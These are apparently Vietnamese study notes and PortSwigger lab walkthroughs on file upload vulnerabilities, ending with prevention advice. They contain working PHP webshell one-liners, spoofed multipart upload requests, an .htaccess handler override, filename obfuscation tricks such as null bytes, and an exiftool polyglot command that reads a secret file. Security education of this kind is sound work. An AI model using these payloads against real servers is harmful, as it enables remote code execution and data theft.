---
title: File Upload

---

---
title: File Upload
---

# What are file upload vulnerabilities?
- Hệ thống luôn tin tưởng vào user input, không validate hoặc validate lỏng lẻo các thuộc tính của file (tên, định dạng, nội dung, dung lượng)
- Khiến một tính năng bình thường (như upload avt,...,..) thành cổng đưa malware lên server => có thể dẫn đến RCE khi attacker upload được các file script chạy ở server-side (PHP, JSP,...)
- Exploit flow: Thường chia làm 2 phase:
    - phase 1 upload: đẩy file chứa malware qua mặt filter lên server => có thể dẫn đến ghi đè file hệ thống hoặc gây lỗi
    - phase 2 trigger: gửi thêm một HTTP request truy cập thẳng vào đường dẫn chứa file vừa upload để ép server thực thi đoạn script độc hại

**Filter lỏng -> up shell -> gọi shell -> RCE**

- Tác động:
    - RCE qua webshell
    - Ghi đè file & Path traversal

# How do file upload vulnerabilities arise?
- Dùng blacklist thay vì whitelist, chỉ cố chặn `.php` mà không chặn `.php5`, `.phtml`, v.v...
- Tin tưởng client-side data: dùng `Content-Type` header từ request gửi lên để xác định loại file. Thứ này có thể bị fake trong Burp Suite
- Server frontend kiểm tra một kiểu, nhưng server backend phân tích file một kiểu khác (parsing discrepancies), hoặc thư mục `/uploads` này chặn execute nhưng thư mục `/uploads/avatars` lại không

Ví dụ: 
- ép `Content-Type` của file shell về `image/jpeg`
- Sửa filename thành `shell.php.jpg` hoặc `shell.phtml`
- Nhét thêm đoạn magic bytes của ảnh lên đầu nội dung file (VD: `GIF89a <?php system($_GET['cmd']); ?>`) để lừa các hàm đọc nội dung như `getimagesize()`
- Gửi request. Bắt đường dẫn file và execute command

# How do web servers handle requests for static files?
- Sau khi bypass filter cần tìm xem con shell của mình đang nằm ở đâu để mà gọi (trigger) nó
    - Ánh xạ 1:1 : đây là kiểu server truyền thống (như Apache/PHP thuần). Khi up một file tên là `shell.php` vào thư mục lưu trữ ảnh gốc
        - Đường dẫn URL sẽ phản ánh chính xác thư mục vật lý trên server: `http://target.com/uploads/images/shell.php` => chỉ cần truy cập URL này là shell chạy

    - Dynamic
        - Với các framework hiện đại (như NodeJS/Express, Python/Django, Ruby on Rails), các URL thường được định tuyến qua code logic (router) chứ không trỏ thẳng vào thư mục vật lý
        - Tuy nghiên server vẫn phải có một thư mục đặc biệt để chứa các file tĩnh như ảnh avatar, CSS, JS. Thường chúng được expose ra ngoài qua các endpoint như `/static/`, `/assets/`, hoặc `/media/`

**Mindset**
- Xác định tĩnh/động: trước khi up file shell, thử up một file ảnh bình thường
- Trace ngược: F12 hoặc xem trong Burp HTTP History xem server tải bức ảnh đó từ đường dẫn nào

Ví dụ: ảnh avatar tải từ `GET /api/v1/users/1/avatar` (ẩn file path) hay `GET /static/uploads/users/avatar.jpg` (lộ file path)?

Nếu là lộ file path (ánh xạ 1:1 cho thư mục static), đó là mục tiêu của ta. Khi up shell thành công, ta cứ trỏ thẳng request tới `/static/uploads/users/shell.php`

- Ngoài ra ta có thể dùng fuzz thư mục upload: nếu upload thành công nhưng không trả về đường dẫn file, thử dùng fuzz kết hợp với wordlist các thư mục phổ biến (như `SecLists/Discovery/Web-Content/common.txt`) để scan các thư mục như `/uploads/`, `/images/`, `/files/`

`ffuf -u "https://target.com/search.php?q=FUZZ" -w wordlist.txt`


- Có 3 trường khi ta truy cập tới con shell vừa upload:
    1. Non-executable: trả về file tải xuống hoặc hiển thị text ảnh
    2. Executable (RCE): sercver parse code PHP/JSP => nhận parameter => trả về output của command (VD: output của lệnh `whoami`)
    3. Trả về plain text của script

- Ở trường hợp 3, khi up được file `.php` nhưng truy cập vào nó lại hiện nguyên dòng code `<?php system(...) ?>` ra màn hình chứ không thực thi
    - Có thể do thư mục `/uploads` đã bị cấu hình tắt quyền thực thi 
    - Nhưng nếu server dính lỗi **misconfiguration** (cấu hình sai) kết hợp với directory traversal, ta có thể up các file `.php` lên các thư mục khác để ghi đè code, hoặc tải về cấu hình nội bộ

**Nhận biết**
- Nếu thấy `Content-Type: application/x-httpd-php` hoặc `text/html` và nội dung là kết quả câu lệnh -> RCE thành công
- Nếu thấy `Content-Type: text/plain` và nội dung là mã nguồn -> server không execute nó -> phải tìm cách bypass cấu hình thư mục (directory traversal ra khỏi `/uploads`) hoặc ép kiểu file qua file `.htaccess`

- Ví dụ bypass bằng `.htaccess`
    - Nếu server cho phép up file `.htaccess`, hãy up 1 file `.htaccess` với nội dung `AddType application/x-httpd-php .l33t` 
    - Sau đó up con shell có đuôi `.l33t`. Server lúc này sẽ bị ép phải chạy file `.l33t` như là PHP


# Exploiting unrestricted file uploads to deploy a web shell
- Web shell là một tập lệnh độc hại cho phép kẻ tấn công thực thi các lệnh tùy ý trên một máy chủ web từ xa chỉ đơn giản bằng cách gửi các HTTP request tới đúng endpoint
- Lỗ hổng nằm việc hệ thống cho phép upload thẳng các file có định dạng thực thi (`.php, .jsp, .py, v.v.`) và thư mục đích không bị chặn quyền execute
- Ta luôn ưu tiên dynamic webshell nhận tham số từ URL (`$_GET`) hoặc Body (`$_POST`) để dễ dàng bypass các hệ thống ghi log

**PHP One-liner**
- Thay vì dùng `system()` dễ bị filter chặn, ta có thể dùng backticks hoặc hàm khác: 
    - `<?php echo $_GET[cmd]; ?>`
    - `<?php passthru($_GET['cmd']); ?>`
    - `<?php $c=$_GET['c']; shell_exec($c); ?>`

# Exploiting flawed validation of file uploads
- 3 điểm phổ biến
    - Chỉ kiểm tra ở client-side: dev dùng JS chặn việc chọn file `.php` trên trình duyệt. (có thể bắt HTTP request qua Burp Suite là sửa được)
    - Blacklist thiếu: dev lọc đuôi `.php` nhưng quên `.php5, .phtml, hoặc .pHp` (bypass phân biệt chữ hoa/thường)
    - Mismatched Content-Type: server chỉ nhìn vào header `Content-Type` do client gửi lên (ví dụ `image/jpeg`) để đánh giá file, mà không thực sự kiểm tra nội dung (magic bytes) bên trong file

- Không xác thực **magic bytes**
    - Bất kỳ dữ liệu nào đến từ phía client (`User-Agent`, `Referer`, `Cookies`, và cả các tham số trong Form data như `Content-Type`, `filename`) đều là **Untrusted Data**. Việc backend tin tưởng tuyệt đối vào `Content-Type` do trình duyệt tự sinh ra là một lỗ hổng nguy hiểm

VD:
```php!
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: application/x-php

<?php echo system($_GET['cmd']); ?>
```

Bypass thành
```php
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg

<?php echo system($_GET['cmd']); ?>
```


 **[LAB 1](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)**

![image](https://hackmd.io/_uploads/rJDYm_3_-e.png)

![image](https://hackmd.io/_uploads/SkSeP_ndbl.png)

- đăng nhập vào ứng dụng bằng tài khoản được cấp wiener:peter
- Có chức năng upload avatar, chọn tệp `exploit.php` chữa php one-liner và tải nó lên. Ứng dụng sẽ báo upload thành công
- Quay lại trang tài khoản cá nhân. Mở Burp Suite lên vào tab Proxy > HTTP history. Tìm request dùng để load cái avatar hiện tại (thường là request GET trỏ tới `/files/avatars/<tên-file>`)
![image](https://hackmd.io/_uploads/BkhgOu2ubl.png)

- Gửi cái request GET tải ảnh đó sang Burp Repeater. Chỉnh sửa lại đường dẫn trỏ thẳng vào con shell
![image](https://hackmd.io/_uploads/rkMBO_nOZg.png)

- Lấy được mã để submit lab


**[LAB 2](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)**

![image](https://hackmd.io/_uploads/S13KXO2_We.png)

- Cũng tương tự với LAB 1, nhưng ở LAB 2 backend chỉ nhìn vào Content-Type trong payload multipart mà không kiểm tra cấu trúc dữ liệu thực sự của file. Vì cái Content-Type này do trình duyệt của ta tạo ra, ta có quyền sửa nó bằng Burp Suite trước khi nó đến server
- Tạo một file `shell.php` chứa `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- Khi upload lên thì web sẽ chặn
![image](https://hackmd.io/_uploads/S1Zf5unOWl.png)

- Web chỉ cho phép `image/jpeg` hoặc `image/png`, nên ta sẽ bypass bằng cách sửa giá trị `Content-Type` thành `image/jpeg`
![image](https://hackmd.io/_uploads/ryzPqOhOZx.png)

- Khi POST thành công thì ta sẽ `GET /files/avatars/shell.php` để lấy shell và trả về secret
![image](https://hackmd.io/_uploads/rkIi9OndWl.png)

- Lấy mã và submit

# Preventing file execution in user-accessible directories

- Bypass được filter, up thành công shell. Gửi request `GET /static/exploit.php?command=id`. Nhưng thay vì trả về kết quả `uid=...`, server lại trả về đoạn code `<?php echo system... ?>` dưới dạng `Content-Type: text/plain`
- Vì dev đã cấu hình thư mục `/static/` (hoặc `/uploads/`) không có quyền thực thi mã (non-executable). Các module như PHP-FPM bị vô hiệu hóa tại thư mục này, biến con shell thành một tệp văn bản vô hại

**Tìm điểm mù của cấu hình**
- Có thể dev chỉ khóa cửa chính (thư mục `/uploads/`) vì biết user sẽ up file vào đó, nhưng lại quên khóa các thư mục gốc như `/var/www/html/` hoặc `/tmp/`. Nếu ta có thể up con shell ra khỏi `/uploads/` và rơi vào một thư mục không bị hạn chế ta sẽ có RCE
- Ở `filename` Backend thường nối chuỗi đường dẫn lưu tệp hơi kém: `$upload_dir . $_FILES['file']['name']`. Nếu ta thao túng chuỗi name này ta sẽ là vua

**[LAB 3](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)**
![image](https://hackmd.io/_uploads/B1-lLjAdbg.png)

- Nếu up file `shell.php` bình thường và truy cập nó qua `GET /files/avatars/shell.php`, server sẽ chỉ trả về nội dung của file PHP dưới plain text thay vì thực thi nó

![image](https://hackmd.io/_uploads/rJjSIiAOZl.png)

- Server có cơ chế sanitize tên file. Nếu gửi `filename="../shell.php"`, server sẽ stripping chuỗi traversal và chỉ lưu thành `avatars/shell.php`
![image](https://hackmd.io/_uploads/SJDY8oCO-e.png)

- Ccách bypass: Bộ lọc xóa chuỗi `../` của server được viết sơ sài, nó không decode dữ liệu trước khi lọc hoặc chỉ lọc một lần. Từ đây ta có thể bypass bằng URL Encoding
![image](https://hackmd.io/_uploads/SJYFviR_Zg.png)

- Gọi nó bằng request `GET /files/avatars/shell.php` và lấy mã secret
![image](https://hackmd.io/_uploads/SyqbPjR_-e.png)


# Insufficient blacklisting of dangerous file types
- Dev chỉ chặn được những cái đuôi phổ biến nhất `.php, .exe, .jsp`. Nhưng web server (như Apache,..) lại được cấu hình mặc định để nhận diện và chạy rất nhiều cái đuôi dị khác như là mã nguồn (`.php5, .shtml`)
- Có một tính năng của các web server (đặc biệt là Apache và IIS). Để tiện lợi cho dev, Apache cho phép đặt một tệp `.htaccess` ở bất kỳ thư mục nào để ghi đè cấu hình gốc của máy chủ tại chính thư mục đó
- Nếu hệ thống có một blacklist chặn tất cả các đuôi `.php, .php5, .phtml`, nhưng lại quên không chặn việc tải lên tệp `.htaccess`, ta có thể tự tải lên tệp `.htaccess` với nội dung cấu hình lại MIME type theo ta muốn (VD đuôi `.l33t` được parse dưới dạng PHP) cho máy chủ
- Nếu như Apache có `.htaccess`, thì IIS (Internet Information Services) của windows dùng `web.config` để quản lý cấu hình ở mức thư mục. Có kiểu tấn công hoàn toàn giống nhau: nếu hệ thống chặn mạnh các tệp thực thi của ASP.NET như `.asp, .aspx, .ashx` nhưng lại để lọt tệp `web.config`, ta có thể tự tạo một đuôi bịa nào đó có quyền thực thi

**[LAB 4](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)**
![image](https://hackmd.io/_uploads/ByQq2oRuWe.png)
- Khi thử tải lên một tệp `.php`, hệ thống chặn lại, nhưng các header trong response lại tiết lộ rằng ta đang giao tiếp với một máy chủ Apache
![image](https://hackmd.io/_uploads/Bk7cni0O-x.png)
![image](https://hackmd.io/_uploads/Hkw6as0OZx.png)

- Bắt request `POST /my-account/avatar` dùng để tải tệp và ném sang Repeater. Sửa giá trị filename thành `.htaccess`, đổi `Content-Type` thành `text/plain` và thay thế nội dung file bằng chỉ thị Apache (AddType...). Gửi đi và ta sẽ thấy thông báo tệp được tải lên thành công.
![image](https://hackmd.io/_uploads/Skp8Tj0d-l.png)

- Sử dụng lại chính request POST vừa rồi trong Repeater. Lần này ta đổi filename thành `shell.l33t` và đổi nội dung thành mã nguồn PHP đọc secret. Gửi request
![image](https://hackmd.io/_uploads/HJuBaj0Obx.png)

- Ở request `GET /files/avatars/<YOUR-IMAGE>` đổi tên file trong đường dẫn thành `shell.l33t` và Send để lấy mã secret
![image](https://hackmd.io/_uploads/B1UwpsCdWe.png)

**Obfuscating file extensions**
- Lợi dụng việc mã xác thực có phân biệt chữ hoa chữ thường nhưng mã ánh xạ MIME thì không (VD: dùng `shell.pHp`)
- Multiple extensions: tên tệp có nhiều phần mở rộng cùng lúc (VD: `shell.php.jpg`)
- Ký tự rác ở cuối: thêm dấu chấm hoặc khoảng trắng vào cuối tên tệp (VD: `shell.php.`) các thành phần xử lý sau sẽ tự động strip chúng đi
- Mã hóa URL: mã hóa dấu chấm hoặc dấu gạch chéo (VD: đổi dấu chấm thành `%2E` trong `shell%2Ephp`) để lọt qua bộ lọc, với hy vọng nó sẽ được decoded ở phía máy chủ sau đó
- Ký tự ngắt chuỗi: thêm dấu chấm phẩy hoặc ký tự null byte được mã hóa URL trước đuôi giả (VD: `shell.asp%00.jpg` hoặc `shell.asp;.jpg`). Kỹ thuật này lợi dụng độ lệch pha khi ngôn ngữ bậc cao (PHP/Java) xác thực toàn bộ chuỗi, nhưng các hàm bậc thấp (C/C++) của máy chủ lại kết thúc chuỗi sớm
- Chuẩn hóa Unicode: dùng các ký tự unicode nhiều byte lạ (VD: các chuỗi `xC0 x2E` hoặc `xC4 xAE`), lừa quá trình chuyển đổi hoặc chuẩn hóa ép chúng biến thành dấu chấm thông thường hoặc null bytes trước khi lưu vào đường dẫn
- Kỹ thuật Non-Recursive Filter Bypass, thay vì chặn request thì lại dùng hàm kiểu `replace('.php', '')` để xóa đi cái đuôi nguy hiểm.
- Lổ hổng ở đây là không cho vòng lặp chạy đệ quy (chạy liên tục cho đến khi chuỗi sạch hoàn toàn). Nó chỉ cắt đúng 1 lần rồi bỏ đi
- Khi ta nhồi chuỗi `.php` vào ngay giữa một chuỗi `.php` khác (thành `.p.phphp`), bộ lọc sẽ tìm thấy mục tiêu ở giữa và cắt nó đi. Hai mảnh còn lại ở hai bên lập tức khép lại thành một đuôi `.php` hoàn chỉnh và bypass bộ lọc

**[LAB 5](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)**

![image](https://hackmd.io/_uploads/HyUVQnC_Zl.png)
- Thử tải tệp `shell.php` lên thấy bị chặn. Gửi request `POST /my-account/avatar` đó sang Repeater
![image](https://hackmd.io/_uploads/B1LE72C_-l.png)

- Trong tab Repeater của request POST, tìm đến phần body chứa file PHP, đổi giá trị của tham số `filename` thành `shell.php%00.jpg`
- Ta sẽ thấy response ghi là tệp `shell.php` đã được tải lên thành công. Điều này chứng tỏ null byte và phần đuôi `.jpg` đã bị hệ thống cắt bỏ khi lưu
![image](https://hackmd.io/_uploads/S1Ltmh0OZx.png)

- Gửi request `GET /files/avatars/shell.php` để lấy mã secret
![image](https://hackmd.io/_uploads/HyUFmnR_Wg.png)

# Flawed validation of the file's contents
- Thay vì chỉ nhìn `Content-Type, filename`, thì sẽ bắt đầu soi vào sâu bên trong của tệp. Các hàm phổ biến thường được sử dụng ở bước  này là `getimagesize()` trong PHP hoặc các thư viện xử lý ảnh tương tự
- Hàm này sẽ đọc phần `Header` của tệp (magic bytes) để trích xuất metadata (chiều dài, chiều rộng, hệ màu). Nếu là một file `.php`, hàm này sẽ trả về false và trả về lỗi
- Khi kiểm tra magic bytes, nó sẽ mở tệp ra và đọc các byte đầu tiên. Nếu nó thấy `FF D8 FF`, nó sẽ coi đây là ảnh JPEG hợp lệ và cho phép lưu xuống
- Khi engine PHP được gọi để thực thi một tệp, nó sẽ quét từ trên xuống dưới. Nó sẽ bỏ qua những byte rác (như dữ liệu hình ảnh nhị phân) và chỉ kích hoạt khi gặp đúng thẻ mở `<?php`
- Từ đó tệp Polyglot ra đời: Vừa mang magic Bytes, cấu trúc của một ảnh để bypass bộ lọc tải lên, vừa chứa payload của một webshell để lừa engine thực thi

**[LAB 6](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)**

![image](https://hackmd.io/_uploads/SkCJwJ7F-l.png)

- Đăng nhập vào tài khoản wiener:peter
- Chạy lệnh exiftool để tạo ra tệp `polyglot.php`
```php!
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <tên_ảnh_gốc.jpg> -o polyglot.php
```
![image](https://hackmd.io/_uploads/rJdg_yQF-g.png)

- Tải `polyglot.php` lên làm avatar. Bộ lọc nội dung của server sẽ mở tệp ra, thấy cấu trúc ảnh hợp lệ nên cho qua

![image](https://hackmd.io/_uploads/BJ4-91mt-x.png)

- Gửi request `GET /files/avatars/polyglot.php`
- Kiểm tra HTTP Response của request đó sẽ thấy secret nằm ở giữa `START` và `END`
![image](https://hackmd.io/_uploads/SJmf9kXKbe.png)

# Exploiting file upload race conditions
- Quy trình chuẩn của một file upload chứa mã độc
    - Server nhận file
    - Server lưu file thẳng vào thư mục `/uploads/shell.php`
    - Máy chủ chạy hàm kiểm tra xem file có chứa mã độc hay virus không
    - Nếu phát hiện thì nó xóa file đi

- Nhưng khoảng thời gian từ bước 2 đến bước 4 mất vài ms (thậm chí lâu hơn). Trong ms ngắn đó con shell của ta thực sự tồn tại và sống trên server
**=> VULN: Time-of-Check to Time-of-Use/Race Condition**

## Race conditions in URL-based file uploads
- Khi dev dùng framework để xử lý form upload trực tiếp, framework thường tự động ném file vào sandbox đệm rất an toàn. Nhưng khi họ làm chức năng upload from URL, họ phải tự viết code dùng `curl` hoặc `requests` để kéo file về, lưu tạm xuống một thư mục (thường là `/tmp/` hoặc một thư mục public nào đó), rồi mới gọi các hàm xác thực
- Lúc này đã tạo ra khoảng hở thời gian (time window) cho ta
- Lạm dụng hàm giả ngẫu nhiên: hàm `uniqid()` của PHP dựa trên thời gian hiện tại của hệ thống. Nếu ta biết thời điểm tệp được tải lên, ta có thể thu hẹp không gian mẫu và brute-force để đoán trúng tên thư mục.
- Lỗ hổng xử lý file lớn: nếu cửa sổ time window của race condition chỉ có 5 ms, việc brute-force là bất khả thi. Nhưng nếu ta cho máy chủ một tệp nặng 10MB hoặc 100MB, máy chủ phải copy từng chunk một. Thời gian tệp tồn tại trên server có thể kéo dài lên tới vài giây, đủ để tìm ra đường dẫn

# Exploiting file upload vulnerabilities without remote code execution
- Khi RCE không được, ta có các attack vector sau:

## Uploading malicious client-side scripts
- Khi bộ lọc chặn RCE, nhưng lại cho phép tải lên hình ảnh `.svg` hoặc tệp `.html`, lúc này  ta chuyển mục tiêu từ server sang client

- SVG là một tệp XML mô tả hình ảnh. Trình duyệt khi mở tệp SVG sẽ phân tích cú pháp XML đó, và SVG hỗ trợ sẵn thẻ `<script>` y hệt như HTML

- Nếu tải tệp lên `example.com` nhưng tệp lại được lưu và phục vụ từ `cdn.example.com` hoặc `s3.amazonaws.com`, mã JS của ta vẫn chạy, nhưng nó không thể lấy được cookie hay thao tác với DOM của `example.com` do khác Origin (khác domain/subdomain). Tệp phải được phục vụ trực tiếp trên cùng domain thì mới tấn công được

## Exploiting vulnerabilities in the parsing of uploaded files
- Khi tải lên một bản CV dưới dạng PDF hoặc word, máy chủ không chỉ lưu nó lại. Nó sẽ dùng một thư viện bên thứ ba (như Apache POI, PDFBox, hoặc ImageMagick) để mở tệp ra, đọc metadata, đếm số trang, hoặc trích xuất văn bản
- Nếu thư viện đọc file đó có lỗ hổng (ví dụ nó phiên dịch sai các ký tự đặc biệt, hoặc nó làm theo các chỉ thị bên trong file), ta sẽ thực thi được các tấn công vào máy chủ 
**=> VULN: Parser Exploitation thường dẫn đến XXE, RCE qua ImageMagick, hoặc DoS**

# Uploading files using PUT
- Trong RESTful API hoặc WebDAV, method `PUT` có mục đích chính là để tạo mới hoặc cập nhật một tài nguyên (tệp) tại một URI cụ thể
- Lỗ hổng xảy ra khi administrator cấu hình sai máy chủ (ví dụ: bật WebDAV trên IIS hoặc Apache) và quên không phân quyền cho các thư mục public như `/images/` hoặc `/css/`, nghĩ rằng trên web không có form upload nên user không up được gì

(Có thể thử thêm với method `OPTIONS`)

# How to prevent file upload vulnerabilities
- whitelist thay vì blacklist: chặn các đuôi `.php5, .shtml,` hay ghi đè `.htaccess`. Nếu chỉ cho phép `.jpg và .png`, ta phải dùng đến oolyglot hoặc tìm lỗi trong chính parser

- Sanitize tên tệp & đổi tên tệp: chặn directory traversal. Nếu dùng hàm tạo chuỗi băm như `md5(time() + random)` để lưu tên tệp mới (ví dụ: `8a2b...9d.jpg`), ta sẽ không thể đoán được đường dẫn file để gọi shell, các kỹ thuật null byte hay obfuscation dựa vào tên gốc cũng sẽ vô dụng

- Sandboxing: để chặn Race Condition. File sẽ nằm trong RAM hoặc một thư mục tạm thời mà chúng ta hoàn toàn không có đường dẫn URL để truy cập, cho đến khi phần mềm quét virus xác nhận nó sạch

- Dùng framework chuẩn: các framework hiện đại như Laravel, Django, Spring Boot đã xử lý khá tốt các tác vụ an toàn như tách tên file, kiểm tra magic bytes và lưu trữ sandbox. Chỉ khi dev tự code bằng PHP thuần hay ASP thuần, các lỗ hổng parser discrepancy (sự bất đồng phân tích cú pháp) mới tồn tại









